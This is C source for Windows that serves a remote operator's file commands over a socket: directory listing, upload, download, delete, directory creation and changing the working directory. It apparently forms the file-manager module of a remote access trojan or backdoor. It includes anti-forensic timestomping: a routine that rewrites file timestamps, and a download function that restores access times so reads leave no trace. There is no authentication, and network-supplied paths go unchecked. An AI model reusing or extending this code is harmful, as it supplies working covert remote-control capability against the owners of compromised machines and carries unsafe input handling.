#include "File_IO.h"

int List_Directory(SOCKET sock)
{
	WIN32_FIND_DATAA dir_info;
	char path[260];
	BYTE DATA[324];
	LPFILE_ERROR err;
	HANDLE h; WSAPOLLFD fd;


	ZeroMemory(path, sizeof(path));


	recv(sock, path, sizeof(path), 0);

	//printf("%s-%d\n", path, sizeof(dir_info));

	h = FindFirstFileA(path, &dir_info);

	*((PDWORD)DATA) = 2;
	err = (LPFILE_ERROR)&DATA[4];


	if (h == INVALID_HANDLE_VALUE)
	{
		err->Code = 404;
		err->Reason = GetLastError();
		send(sock, (char *)DATA, 12, 0);
		return 0;
	}
	else
	{
		err->Code = 200;
		send(sock, (char *)DATA, 12, 0);
	}

	*((PDWORD)DATA) = 1;

	while (1)
	{
		CopyMemory(&DATA[4], &dir_info, sizeof(dir_info));
		send(sock, (char*)DATA, sizeof(DATA), 0);
		/*
		if (!FindNextFileA(h, &dir_info))
		{
			break;
		}
		Sleep(500);
		*/

		fd.fd = sock;
		fd.events = POLLWRNORM;
		fd.revents = 0;

		int ret = WSAPoll(&fd, 1, 10000);
		if (ret > 0)
		{
			if (fd.revents & POLLWRNORM)
			{
				/*recv(sock, (char *)&temp, 4, 0);
				if (temp == 1)
				{
					if (!FindNextFileA(h, &dir_info))
					{
						break;
					}
				}
				else
					break;
				*/
				if (!FindNextFileA(h, &dir_info))
				{
					break;
				}
			}

			if (fd.revents & POLLHUP)
			{
				FindClose(h);
				return 404;
			}
		}
		else
		{
			FindClose(h);
			return 404;
		}

	}

	*((PDWORD)DATA) = 0;
	send(sock, (char *)DATA, 4, 0);
	return 0;
}



int File_Upload(SOCKET sock)
{
	DWORD len,i;
	char path[260];
	FILE_ERROR frr;
	HANDLE h; WSAPOLLFD fd; BYTE DATA[2048];

	i = len = 0;
	ZeroMemory(path, sizeof(path));

	recv(sock, (char *)&len, 4, 0);
	recv(sock, (char *)path, sizeof(path), 0);

	if ((h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
	{
		frr.Code = 404;
		frr.Reason = GetLastError();

		send(sock, (char *)&frr, sizeof(frr), 0);
		return 0;
	}
	else
	{
		frr.Code = 200; send(sock, (char *)&frr, sizeof(frr), 0);
	}

	fd.fd = sock;
	fd.events = POLLRDNORM;
	fd.revents = 0;

	while (i < len)
	{
		int r = WSAPoll(&fd, 1, 10000);
		if (r == 0)
		{
			goto Error_CleanUP;
		}

		if (r == SOCKET_ERROR)
		{
			if (WSAGetLastError() != WSAEWOULDBLOCK)
			{
				goto Error_CleanUP;
			}
		}

		if (r > 0)
		{
			if (fd.revents & POLLRDNORM)
			{
				DWORD I = recv(sock, (char *)DATA, 2048, 0);
				WriteFile(h, DATA, I, &I, NULL);
				FlushFileBuffers(h);
				i += I;
			}

			if ((fd.revents & POLLHUP) || (fd.revents & POLLERR))
			{
				goto Error_CleanUP;
			}
		}
	}

	CloseHandle(h);
	return 0;

Error_CleanUP:
	CloseHandle(h);
	DeleteFileA(path);
	return 404;
}




void File_Download(SOCKET sock)
{
	BYTE DATA[16];
	HANDLE h;
	LPFILE_ERROR err;
	FILETIME cr, ac, mod;

	char path[260];

	ZeroMemory(path, sizeof(path));

	recv(sock, path, sizeof(path), 0);
	err = (LPFILE_ERROR)DATA;

	err->Code = 200;


	if ((h = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
	{

		err->Code = 404;
		err->Reason = GetLastError();
		send(sock, (char *)DATA, 16, 0);
		return;
	}
	else
	{
		GetFileTime(h, &cr, &ac, &mod);
		GetFileSizeEx(h, (PLARGE_INTEGER)&DATA[8]);
		send(sock, (char *)DATA, 16, 0);
	}



	TransmitFile(sock, h, 0, 0, NULL, NULL, 0);
	SetFileTime(h, &cr, &ac, &mod);
	CloseHandle(h);
	return;


}



void Change_Dir(SOCKET sock)
{
	char path[260];
	FILE_ERROR err;
	ZeroMemory(path, sizeof(path));

	recv(sock, path, sizeof(path), 0);

	if (!SetCurrentDirectoryA(path))
	{
		err.Code = 404;
		err.Reason = GetLastError();
	}
	else
	{
		err.Code = 200;
	}

	send(sock, (char *)&err, sizeof(err), 0);
	return;

}

void Get_Cur_Dir(SOCKET sock)
{
	char path[260];

	GetCurrentDirectoryA(sizeof(path), path);

	send(sock, path, sizeof(path), 0);
}


void ChangeFileTime(SOCKET sock)
{
	char path[260];
	FILETIME cr, ac, mod; FILE_ERROR err;
	HANDLE h;
	ZeroMemory(path, sizeof(path));
	//ULONGLONG u;
	recv(sock, (char*)&cr, sizeof(cr), 0);
	recv(sock, path, sizeof(path), 0);

	ac = mod = cr;
	/*
	cr.dwLowDateTime = (DWORD)u;
	cr.dwHighDateTime = u >> 32;
	*/
	//printf("%s - %ld", path,u);
	if ((h = CreateFileA(path, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
	{
		err.Code = 404;
		err.Reason = GetLastError(); //printf("\nFailed To Open File");
		goto _Send_Status;
	}


	if (!SetFileTime(h, &cr, &mod , &ac))
	{
		err.Code = 404;
		err.Reason = GetLastError();
		//printf("\nFailed To Change Time");
	}
	else
		err.Code = 200;
	CloseHandle(h);
	_Send_Status:
	send(sock, (char *)&err, sizeof(err), 0);
	return;
}


void Del_File(SOCKET sock)
{
	char path[260];
	ZeroMemory(path, sizeof(path));
	FILE_ERROR err;

	err.Code = 200;

	recv(sock, path, sizeof(path), 0);

	if (!DeleteFileA(path))
	{
		err.Code = 404;
		err.Reason = GetLastError();
	}
	send(sock, (char *)&err, sizeof(err), 0);
	return;
}

void Create_Dir(SOCKET sock)
{
	char path[260];
	ZeroMemory(path, sizeof(path));
	FILE_ERROR err;

	err.Code = 200;

	recv(sock, path, sizeof(path), 0);

	if (!CreateDirectoryA(path,NULL))
	{
		err.Code = 404;
		err.Reason = GetLastError();
	}
	send(sock, (char *)&err, sizeof(err), 0);
	return;
}
